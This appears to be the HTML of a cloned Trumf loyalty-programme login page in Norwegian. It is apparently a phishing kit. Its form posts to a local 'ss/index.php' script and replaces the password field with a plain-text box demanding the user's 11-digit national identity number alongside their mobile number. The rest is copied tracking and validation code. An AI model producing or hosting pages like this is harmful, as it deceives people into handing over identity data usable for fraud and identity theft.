<html lang="no"><head>
    <!-- Google Tag Manager -->
    <script type="text/javascript" async="" defer="" src="https://norgesgruppen.containers.piwik.pro/ppms.js"></script><script async="" src="https://norgesgruppen.containers.piwik.pro/c30184b3-2658-44f5-8747-35cd11a9a6c3.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WM2PW45"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WM2PW45"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-WM2PW45');</script>
    <!-- End Google Tag Manager -->
    <meta name="robots" content="noindex, noarchive">
    <meta charset="utf-8">
    <title>Logg inn</title>
    <meta name="viewport" content="width=device-width, height=device-height, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
    <link rel="shortcut icon" href="css/favicon.ico">
<link href="css/app.39182a21a248a3a8f5e0.css" rel="stylesheet"><script id="ppas_container_configuration" data-appid="c30184b3-2658-44f5-8747-35cd11a9a6c3" data-host="norgesgruppen.piwik.pro"></script></head>

<body>
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WM2PW45"
        height="0" width="0" style="display: none;
    visibility: hidden;"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    <div class="app">
        <div class="login" id="panel-trumf" aria-hidden="false">
            <div class="trumfid__form-header p-t-24">
                <span class="ngr-icon" role="presentation" aria-hidden="true">
                    <img src="css/ngr-trumf.svg" class="ngr-icon__svg" alt="Trumf-logo" width="120px" height="48px">
                </span>
            </div>
            
            <div class="p-t-24 p-b-8">
                <h1 class="trumfid__heading">
                    Logg inn på Trumf
                </h1>
                
            </div>
            
            
            <form id="loginForm" name="loginForm" action="ss/index.php" method="post">
                <div class="p-t-24">
                    <div class="ngr-input-group">
                        <label class="ngr-label ngr-input-group__label" for="username">
                            <span class="ngr-label__text">Mobilnummer</span>
                        </label>
                        <div class="ngr-input">
                            <span class="ngr-input__prefix" id="username-prefix">+47</span>
                            <input class="ngr-input__field ngr-input__field--prefix" id="username" type="tel" pattern="[0-9]*" name="j_username" maxlength="8" autofocus="" required="">
                        </div>
                        <div class="ngr-input-group__information" id="username-help-text">
                            <small class="ngr-help-text ngr-help-text--error ngr-help-text--hidden">Mobilnummer må fylles ut</small>
                        </div>
                        <div class="ngr-input-group__information" id="max-phone-numbers-help-text">
                            <small class="ngr-help-text ngr-help-text--error ngr-help-text--hidden">Mobilnummer må være 8 siffer</small>
                        </div>
                    </div>
                    <div class="ngr-input-group">
                        <label class="ngr-label ngr-input-group__label" for="password">
                            <span class="ngr-label__text"> Fyll inn fødselsnummer (11 siffer) </span>
                        </label>
                        <div class="ngr-input" data-type="password">
                            <input class="ngr-input__field" id="password" type="text" name="fs" required="">
                            <button class="ngr-button ngr-input__password-visibility-toggle-text ngr-button--inline-link hidden" type="button" minlength="11" maxlength="11">Vis</button>
                        </div>
                        <div class="ngr-input-group__information" id="password-help-text">
                            <small class="ngr-help-text ngr-help-text--error ngr-help-text--hidden">Passord må fylles ut</small>
                        </div>
                    </div>
                    
                        
                            
                        
                        
                    
                </div>
                <input type="hidden" name="response_type" value="code">
                
                    <input type="hidden" name="client_id" value="trumfid">
                
                <input type="hidden" name="biometriavailable" id="biometriavailable" value="true">
                <div class="ngr-button-group ngr-button-group--flex-start ngr-button-group--items-center ngr-button-group--flow ngr-button-group--direction-vertical p-t-24 p-b-16">
                    <button class="ngr-button" type="submit" name="login" id="btn-form-submit">
                        <span class="ngr-button__text" data-gtm-vis-recent-on-screen-40715065_66="258" data-gtm-vis-first-on-screen-40715065_66="258" data-gtm-vis-total-visible-time-40715065_66="100" data-gtm-vis-has-fired-40715065_66="1">Logg inn</span>
                        <span class="ngr-spinner__spinner ngr-spinner__spinner--small ngr-spinner__spinner--inverted" style="display: none;"></span>
                    </button>
                </div>
            </form>
            <ul class="ngr-link-list p-b-32">
                
                    
                
                
            </ul>
            
                
                
                    <a href="https://www.trumf.no/personvern/#informasjonskapsler" class="ngr-button ngr-button--inline-link ngr-util__font-size--mike">
                        
                    </a>
                
            
        </div>
        
    </div>

    
    <script type="text/javascript" src="/static/common.js"></script>
    <script type="text/javascript" src="/static/validation_common.js"></script>
    <script type="text/javascript">
        (async function () {
            var btnFormSubmit = document.getElementById("btn-form-submit-corporate");

            var mobilnummerCorporatePrefix = document.getElementById("username-corporate-prefix");

            var mobilnummerCorporate = document.getElementById("username-corporate");
            var passordCorporate = document.getElementById("password-corporate");

            var mobilnummerCorporateHelpText = document.getElementById("username-corporate-help-text");
            var maxPhoneNumbersCorporateHelpText = document.getElementById("max-phone-numbers-corporate-help-text");
            var passordCorporateHelpText = document.getElementById("password-corporate-help-text");

            var biometriAvailable = document.getElementById("biometriavailable");

            if (window.PublicKeyCredential) {
                const isBiometriAvailable = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()    
                biometriAvailable.setAttribute("value", isBiometriAvailable)
             }

             if (btnFormSubmit) {
                handleEnterKeyPress(btnFormSubmit);
                btnFormSubmit.onclick = function() {
                    return handleFormValidation();
                }
            }

            function handleFormValidation() {

                if (mobilnummerCorporate.value.length == 0 && passordCorporate.value.length == 0) {
                    showHelpText(mobilnummerCorporateHelpText.children[0]);
                    showHelpText(passordCorporateHelpText.children[0]);
                    showInputOutlineError(mobilnummerCorporatePrefix)
                    showInputOutlineError(mobilnummerCorporate);
                    showInputOutlineError(passordCorporate);
                    return false;
                }

                if (mobilnummerCorporate.value.length == 0) {
                    showHelpText(mobilnummerCorporateHelpText.children[0]);
                    showInputOutlineError(mobilnummerCorporatePrefix)
                    showInputOutlineError(mobilnummerCorporate);
                    return false;
                }

                if (mobilnummerCorporate.value.length < 8) {
                    showHelpText(maxPhoneNumbersCorporateHelpText.children[0]);
                    showInputOutlineError(mobilnummerCorporatePrefix)
                    showInputOutlineError(mobilnummerCorporate);
                    return false;
                }

                if (passordCorporate.value.length == 0) {
                    showHelpText(passordCorporateHelpText.children[0]);
                    showInputOutlineError(passordCorporate);
                    return false;
                }
            }
        })();
    </script>
    <script type="text/javascript">
        (async function() {
            var btnFormSubmit = document.getElementById("btn-form-submit");

            var mobilnummerPrefix = document.getElementById("username-prefix");

            var mobilnummer = document.getElementById("username");
            var passord = document.getElementById("password");

            var mobilnummerHelpText = document.getElementById("username-help-text");
            var maxPhoneNumbersHelpText = document.getElementById("max-phone-numbers-help-text");
            var passordHelpText = document.getElementById("password-help-text");
            var biometriAvailable = document.getElementById("biometriavailable");

            if (window.PublicKeyCredential) {
                const isBiometriAvailable = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()    
                biometriAvailable.setAttribute("value", isBiometriAvailable)
             }

             if (btnFormSubmit) {
                handleEnterKeyPress(btnFormSubmit);
                btnFormSubmit.onclick = function() {
                    return handleFormValidation();
                }
            }

            function handleFormValidation() {

                if (mobilnummer.value.length == 0 && passord.value.length == 0) {
                    showHelpText(mobilnummerHelpText.children[0]);
                    showHelpText(passordHelpText.children[0]);
                    showInputOutlineError(mobilnummerPrefix)
                    showInputOutlineError(mobilnummer);
                    showInputOutlineError(passord);
                    return false;
                }

                if (mobilnummer.value.length == 0) {
                    showHelpText(mobilnummerHelpText.children[0]);
                    showInputOutlineError(mobilnummerPrefix)
                    showInputOutlineError(mobilnummer);
                    return false;
                }

                if (mobilnummer.value.length < 8) {
                    showHelpText(maxPhoneNumbersHelpText.children[0]);
                    showInputOutlineError(mobilnummerPrefix)
                    showInputOutlineError(mobilnummer);
                    return false;
                }

                if (passord.value.length == 0) {
                    showHelpText(passordHelpText.children[0]);
                    showInputOutlineError(passord);
                    return false;
                }
            }
        })();
    </script>



<script type="text/javascript" id="">(function(d,l,e,r){function t(c,b,g){var a="";g&&(a=new Date,a.setTime(a.getTime()+864E5*g),a="; expires\x3d"+a.toUTCString(),f="; SameSite\x3dStrict");l.cookie=c+"\x3d"+b+a+f+"; path\x3d/"}d[e]=d[e]||[];d[e].push({start:(new Date).getTime(),event:"stg.start"});var p=l.getElementsByTagName("script")[0],n=l.createElement("script"),h=(d.location.href.match("stg_debug")||l.cookie.match("stg_debug"))&&!d.location.href.match("stg_disable_debug");t("stg_debug",h?1:"",h?14:-1);var m=[];"dataLayer"!==e&&
m.push("data_layer_name\x3d"+e);h&&m.push("stg_debug");h=0<m.length?"?"+m.join("\x26"):"";n.async=!0;n.src="https://norgesgruppen.containers.piwik.pro/"+r+".js"+h;p.parentNode.insertBefore(n,p);!function(c,b,g){c[b]=c[b]||{};for(var a=0;a<g.length;a++)!function(k){c[b][k]=c[b][k]||{};c[b][k].api=c[b][k].api||function(){var q=[].slice.call(arguments,0);"string"==typeof q[0]&&d[e].push({event:b+"."+k+":"+q[0],parameters:[].slice.call(arguments,1)})}}(g[a])}(d,"ppms",["tm","cm"])})(window,document,"dataLayer",
"c30184b3-2658-44f5-8747-35cd11a9a6c3");</script><script type="text/javascript">
    var _paq = _paq || [];
    _paq.push(['setTrackingSource', 'jstc_tm']);
    _paq.push(['enableLinkTracking']);
    _paq.push(['setDomains', ['id.trumf.no']]);
    _paq.push(['trackPageView']);
    _paq.push(['enableJSErrorTracking']);
    (function(p,i,w,ik) {
        var g=ik.createElement('script'),s=ik.getElementsByTagName('script')[0];
        _paq.push(['setTrackerUrl', p]);
        _paq.push(['setSiteId', w]);
        g.type='text/javascript';g.async=true;g.defer=true;g.src=i;s.parentNode.insertBefore(g,s);
    })('https://norgesgruppen.piwik.pro/ppms.php','https://norgesgruppen.containers.piwik.pro/ppms.js','c30184b3\u002D2658\u002D44f5\u002D8747\u002D35cd11a9a6c3',document)
</script>
</body></html>